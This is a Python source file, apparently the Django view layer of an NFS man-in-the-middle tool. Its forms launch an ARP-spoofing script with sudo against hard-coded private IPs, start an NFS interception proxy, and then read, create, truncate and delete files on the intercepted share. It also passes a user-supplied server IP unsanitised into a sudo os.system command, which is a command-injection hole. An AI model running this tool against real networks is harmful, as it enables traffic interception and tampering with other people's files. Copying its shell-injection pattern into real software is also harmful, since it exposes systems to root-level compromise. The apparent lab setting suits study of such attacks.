import json
import os
import socket
import subprocess
from datetime import datetime

import libnfs
import timeout_decorator
from django.shortcuts import redirect

from mitm.forms import StartNfsMitmForm, GetFileForm, DeleteFileForm, ListDirForm, FileStatsForm, CreateFileForm, \
    ClearFileForm
from mitm.models import NfsServer
from mitm.multiform import MultiFormsView
from mitm_scanner.settings import BASE_DIR

INITIAL = 0


def err_message(filename=None, exception=None):
    if filename is None:
        s = "File not found."
    else:
        s = "File \'" + str(filename) + "\' not found."
    if exception is None:
        return s
    else:
        return s + "\n\nEXCEPTION: " + str(exception)


class Home(MultiFormsView):
    template_name = 'home.html'
    success_url = 'home'
    last_updated = ''
    dir_nfs_mitm = '/home/daniel/nfs-mitm/'
    server_ip = ''
    output_text = 'N/A'
    form_classes = {
        'start_nfs': StartNfsMitmForm,
        'get_file': GetFileForm,
        'list_dir': ListDirForm,
        'file_stats': FileStatsForm,
        'create_file': CreateFileForm,
        'clear_file': ClearFileForm,
        'delete_file': DeleteFileForm,
    }

    # INIT AND DISPATCHER =====================================================
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

    def dispatch(self, request, *args, **kwargs):
        global INITIAL
        if INITIAL == 0:
            request.session.flush()
            INITIAL = 1
        self.output_text = request.session.get('output_text', default=self.output_text)
        self.server_ip = request.session.get('server_ip', default=self.server_ip)
        return super(Home, self).dispatch(request, *args, **kwargs)

    # HELPERS ================================================================
    @timeout_decorator.timeout(10, use_signals=False)
    def get_mount_url(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('localhost', 2050))
            data, address = sock.recvfrom(65412)
            sock.close()
            return data.decode('utf-8')
        except Exception as e:
            return "NONE"

    def update_last_updated(self):
        tmp = datetime.now()
        self.last_updated = tmp.strftime("%m/%d/%Y -- %H:%M:%S")
        return self.last_updated

    # MULTI FORM FUNCTIONS =================================================
    @staticmethod
    def get_start_nfs_initial():
        return {'server_ip': '172.16.119.136'}

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        mount_url = self.get_mount_url()
        if mount_url == "NONE" and self.server_ip != "":
            refresh = True
        else:
            refresh = False
        context.update({
            "server_ip": self.server_ip,
            "mount_url": mount_url,
            "last_updated": self.update_last_updated(),
            "nfs_mitm_dir": self.dir_nfs_mitm,
            "output_text": self.output_text,
            "refresh": refresh
        })
        return context

    # validate START NFS MITM form
    def start_nfs_form_valid(self, form):
        server_ip = str(form.cleaned_data['server_ip'])
        self.request.session['server_ip'] = server_ip
        arpspoof = form.cleaned_data['arpspoof']
        popout = form.cleaned_data['popout']
        NfsServer.objects.all().delete()

        # open ARP SPOOF terminal
        command = "sudo python3 " + BASE_DIR + "/mitm/arp_spoof.py -g 172.16.119.136 -t 172.16.119.137"
        if arpspoof:
            if popout:
                subprocess.call(['gnome-terminal', '--window-with-profile=MY_PROFILE', '-e', command])
            else:
                os.system(command)

        # open NFS MITM terminal
        command = "sudo python3 " + self.dir_nfs_mitm + "nfs_mitm.py -s " + server_ip
        if popout:
            subprocess.call(['gnome-terminal', '--window-with-profile=MY_PROFILE', '-e', command])
        else:
            os.system(command)
        return redirect(self.success_url)

    # validate GET FILE form
    def get_file_form_valid(self, form):
        mount_url = self.get_mount_url()
        name = str(form.cleaned_data['name'])
        try:
            nfs = libnfs.NFS(mount_url)
            self.request.session['output_text'] = nfs.open(name, mode='r').read()
        except Exception as e:
            self.request.session['output_text'] = err_message(name, e)
        return redirect(self.success_url)

    # validate LIST DIR form
    def list_dir_form_valid(self, form):
        mount_url = self.get_mount_url()
        directory = str(form.cleaned_data['directory'])
        try:
            nfs = libnfs.NFS(mount_url)
            if directory is None or directory is "":
                directory = "."
            self.request.session['output_text'] = "DIR: " + directory + "\n" + str(nfs.listdir(directory))
        except Exception as e:
            self.request.session['output_text'] = err_message(directory, e)
        return redirect(self.success_url)

    # validate FILE STATS form
    def file_stats_form_valid(self, form):
        mount_url = self.get_mount_url()
        name = str(form.cleaned_data['name'])
        try:
            nfs = libnfs.NFS(mount_url)
            stats = nfs.open(name, mode='r').fstat()
            self.request.session['output_text'] = json.dumps(stats, indent=3)
        except Exception as e:
            self.request.session['output_text'] = err_message(name, e)
        return redirect(self.success_url)

    # validate CREATE FILE form
    def create_file_form_valid(self, form):
        mount_url = self.get_mount_url()
        name = str(form.cleaned_data['name'])
        try:
            nfs = libnfs.NFS(mount_url)
            nfs.open(name, mode='w').truncate(0)
            self.request.session['output_text'] = "File " + name + " created."
        except Exception as e:
            self.request.session['output_text'] = err_message(name, e)
        return redirect(self.success_url)

    # validate CLEAR FILE form
    def clear_file_form_valid(self, form):
        mount_url = self.get_mount_url()
        name = str(form.cleaned_data['name'])
        try:
            nfs = libnfs.NFS(mount_url)
            nfs.open(name, mode='w').truncate(0)
            self.request.session['output_text'] = "File " + name + " cleared."
        except Exception as e:
            self.request.session['output_text'] = err_message(name, e)
        return redirect(self.success_url)

    # validate DELETE FILE form
    def delete_file_form_valid(self, form):
        mount_url = self.get_mount_url()
        name = str(form.cleaned_data['name'])
        try:
            nfs = libnfs.NFS(mount_url)
            file = nfs.open(name, mode='w')
            libnfs.delete_NFSFileHandle(file._nfsfh)
            self.request.session['output_text'] = "File " + name + " deleted."
        except Exception as e:
            self.request.session['output_text'] = err_message(name, e)
        return redirect(self.success_url)
